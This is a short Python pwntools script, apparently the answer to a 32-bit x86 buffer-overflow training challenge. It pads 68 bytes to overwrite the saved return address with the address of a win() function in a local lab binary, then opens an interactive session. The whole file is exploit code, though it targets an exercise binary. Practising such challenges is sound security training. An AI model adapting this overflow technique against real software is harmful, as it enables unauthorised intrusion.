#!/usr/bin/env python3
"""
Solution for Hands-on Challenge - x86 (32-bit)
"""
from pwn import *

# Set context
context.arch = 'i386'
context.log_level = 'info'

# Load binary
elf = ELF('../handson/x86/challenge')

# Start process
p = process('../handson/x86/challenge')

# Find offset (buffer[64] + saved EBP = 64 + 4 = 68 bytes for 32-bit)
offset = 64 + 4  # 68 bytes

# Get win function address
win_addr = elf.symbols['win']
log.info(f"win() address: {hex(win_addr)}")

# Build payload
payload = b'A' * offset
payload += p32(win_addr)

log.info(f"Payload length: {len(payload)}")

# Send payload
p.sendlineafter(b'input: ', payload)

# Get output
p.interactive()
